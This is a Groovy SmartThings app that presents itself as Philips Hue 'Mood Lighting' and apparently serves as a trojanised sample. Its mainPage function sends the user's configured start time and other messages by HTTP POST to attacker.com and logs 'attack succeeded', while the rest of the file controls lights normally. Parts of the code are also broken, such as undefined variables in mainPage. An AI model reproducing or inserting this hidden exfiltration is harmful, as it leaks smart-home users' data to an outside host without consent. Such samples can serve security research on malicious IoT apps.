
definition(
    name:"Hue Mood Lighting",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Sets the colors and brightness level of your Philips Hue lights to match your mood.",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Partner/hue.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Partner/hue@2 x.png"
)

preferences{
    page(name:"mainPage",title:"Adjust the color of your Hue lights to match your mood.",install:true,uninstall:true)
    page(name:"timeIntervalInput",title:"Only during a certain time"){
        section{
            input"starting","time",title:"Starting",required:false
            input"ending","time",title:"Ending",required:false
            }
        }
}

def mainPage(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${starting}"
    ]
    ]
    if(oncePerDayOk(lastTime)){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hello"
        ]
        ]
        if(frequency){
            if(lastTime==null||now()-lastTime>=frequency*60000){
                takeAction(evt)
            }
        }
        else{
                takeAction(evt)
            }
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
            log.debug"Not taking action because it was already taken today"
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}
private anythingSet(){
    for(name in["motion","contact","contactClosed","acceleration","mySwitch","mySwitchOff","arrivalPresence","departurePresence","smoke","water","button1","triggerModes","timeOfDay"]){
        if(settings[name]){
            return true
        }
    }
    return false
}

private ifUnset(Map options,String name,String capability){
    if(!settings[name]){
        input(options,name,capability)
        }
}

private ifSet(Map options,String name,String capability){
    if(settings[name]){
        input(options,name,capability)
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    subscribeToEvents()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    unschedule()
    subscribeToEvents()
}

def subscribeToEvents(){
    subscribe(app,appTouchHandler)
    subscribe(contact,"contact.open",eventHandler)
    subscribe(contactClosed,"contact.closed",eventHandler)
    subscribe(acceleration,"acceleration.active",eventHandler)
    subscribe(motion,"motion.active",eventHandler)
    subscribe(mySwitch,"switch.on",eventHandler)
    subscribe(mySwitchOff,"switch.off",eventHandler)
    subscribe(arrivalPresence,"presence.present",eventHandler)
    subscribe(departurePresence,"presence.not present",eventHandler)
    subscribe(smoke,"smoke.detected",eventHandler)
    subscribe(smoke,"smoke.tested",eventHandler)
    subscribe(smoke,"carbonMonoxide.detected",eventHandler)
    subscribe(water,"water.wet",eventHandler)
    subscribe(button1,"button.pushed",eventHandler)
    
    if(triggerModes){
        subscribe(location,modeChangeHandler)
    }
    
    if(timeOfDay){
        schedule(timeOfDay,scheduledTimeHandler)
    }
}

def eventHandler(evt=null){
    log.trace"Executing Mood Lighting"
    if(allOk){
        log.trace"allOk"
        def lastTime=state[frequencyKey(evt)]
        if(oncePerDayOk(lastTime)){
            if(frequency){
                if(lastTime==null||now()-lastTime>=frequency*60000){
                    takeAction(evt)
                }
            }
            else{
                    takeAction(evt)
                }
        }
        else{
                log.debug"Not taking action because it was already taken today"
            }
    }
}

def modeChangeHandler(evt){
    log.trace"modeChangeHandler$evt.name:$evt.value($triggerModes)"
    if(evt.value in triggerModes){
        eventHandler(evt)
    }
}

def scheduledTimeHandler(){
    log.trace"scheduledTimeHandler()"
    eventHandler()
}

def appTouchHandler(evt){
    takeAction(evt)
}

private takeAction(evt){
    
    if(frequency||oncePerDay){
        state[frequencyKey(evt)]=now()
    }
    
    def hueColor=0
    def saturation=100
    
    switch(color){
        case"White":
            hueColor=52
            saturation=19
            break;
            case"Daylight":
            hueColor=53
            saturation=91
            break;
            case"Soft White":
            hueColor=23
            saturation=56
            break;
            case"Warm White":
            hueColor=20
            saturation=80
            break;
            case"Blue":
            hueColor=70
            break;
            case"Green":
            hueColor=39
            break;
            case"Yellow":
            hueColor=25
            break;
            case"Orange":
            hueColor=10
            break;
            case"Purple":
            hueColor=75
            break;
            case"Pink":
            hueColor=83
            break;
            case"Red":
            hueColor=100
            break;
            }
    
    state.previous=[:]
    
    hues.each{
        state.previous[it.id]=[
        "switch":it.currentValue("switch"),
        "level":it.currentValue("level"),
        "hue":it.currentValue("hue"),
        "saturation":it.currentValue("saturation")
        ]
        }
    
    log.debug"current values=$state.previous"
    
    def newValue=[hue:hueColor,saturation:saturation,level:lightLevel as Integer?:100]
    log.debug"new value=$newValue"
    
    hues*.setColor(newValue)
}

private frequencyKey(evt){
    "lastActionTimeStamp"
}

private dayString(Date date){
    def df=new java.text.SimpleDateFormat("yyyy-MM-dd")
    if(location.timeZone){
        df.setTimeZone(location.timeZone)
    }
    else{
            df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
        }
    df.format(date)
}


private oncePerDayOk(Long lastTime){
    def result=lastTime?dayString(new Date())!=dayString(new Date(lastTime)):true
    log.trace"oncePerDayOk=$result-$lastTime"
    result
}


private getAllOk(){
    modeOk&&daysOk&&timeOk
}

private getModeOk(){
    def result=!modes||modes.contains(location.mode)
    log.trace"modeOk=$result"
    result
}

private getDaysOk(){
    def result=true
    if(days){
        def df=new java.text.SimpleDateFormat("EEEE")
        if(location.timeZone){
            df.setTimeZone(location.timeZone)
        }
        else{
                df.setTimeZone(TimeZone.getTimeZone("America/New_York"))
            }
        def day=df.format(new Date())
        result=days.contains(day)
    }
    log.trace"daysOk=$result"
    result
}

private getTimeOk(){
    def result=true
    if(starting&&ending){
        def currTime=now()
        def start=timeToday(starting,location?.timeZone).time
        def stop=timeToday(ending,location?.timeZone).time
        result=start<stop?currTime>=start&&currTime<=stop:currTime<=stop||currTime>=start
    }
    log.trace"timeOk=$result"
    result
}

private hhmm(time,fmt="h:mm a")
{
    def t=timeToday(time,location.timeZone)
    def f=new java.text.SimpleDateFormat(fmt)
    f.setTimeZone(location.timeZone?:timeZone(time))
    f.format(t)
}

private timeIntervalLabel()
{
    (starting&&ending)?hhmm(starting)+"-"+hhmm(ending,"h:mm a z"):""
}


